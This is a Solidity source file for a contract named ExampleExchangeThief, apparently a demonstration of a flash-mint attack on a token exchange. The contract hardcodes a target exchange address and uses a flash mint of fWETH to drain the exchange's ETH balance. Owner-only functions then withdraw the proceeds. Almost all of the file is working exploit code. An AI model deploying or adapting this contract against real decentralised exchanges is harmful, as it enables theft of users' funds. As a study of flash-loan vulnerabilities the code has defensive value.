pragma solidity 0.5.16;




contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    
    constructor () internal {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    
    function owner() public view returns (address) {
        return _owner;
    }

    
    modifier onlyOwner() {
        require(isOwner(), "Ownable: caller is not the owner");
        _;
    }

    
    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }

    
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}



interface IFlashWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
    function flashMint(uint256) external;
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IExchange {
    function depositETH() external;
    function depositFWETH(uint256) external;
    function withdrawETH(uint256) external;
    function withdrawFWETH(uint256) external;
    function internalSwapToETH(uint256) external;
    function internalSwapToFWETH(uint256) external;
    function ethBalance() external returns (uint256);
    function fwethBalance() external returns (uint256);
    function fWETH() external returns (address);
}








contract ExampleExchangeThief is Ownable {

    IExchange public exchange = IExchange(0x5d84fC93A6a8161873a315C233Fbd79A88280079); 
    IFlashWETH public fWETH = IFlashWETH(exchange.fWETH()); 

    
    function () external payable {}

    
    function beginFlashMint() public payable onlyOwner {
        
        
        exchange.internalSwapToETH(exchange.fwethBalance());
        
        fWETH.flashMint(exchange.ethBalance()); 
    }

    
    function executeOnFlashMint(uint256 amount) external {
        
        require(msg.sender == address(fWETH), "only FlashWETH can execute");
        
        fWETH.approve(address(exchange), amount);
        exchange.depositFWETH(amount);
        
        exchange.withdrawETH(amount);
        
        
        
        
        fWETH.deposit.value(amount)();
        
        
        
    }

    
    
    

    function withdrawMyETH() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function withdrawMyFWETH() public onlyOwner {
        fWETH.transfer(msg.sender, fWETH.balanceOf(address(this)));
    }

    
    
    

    function ethBalance() external view returns (uint256) { return address(this).balance; }
    function fwethBalance() external view returns (uint256) { return fWETH.balanceOf(address(this)); }
}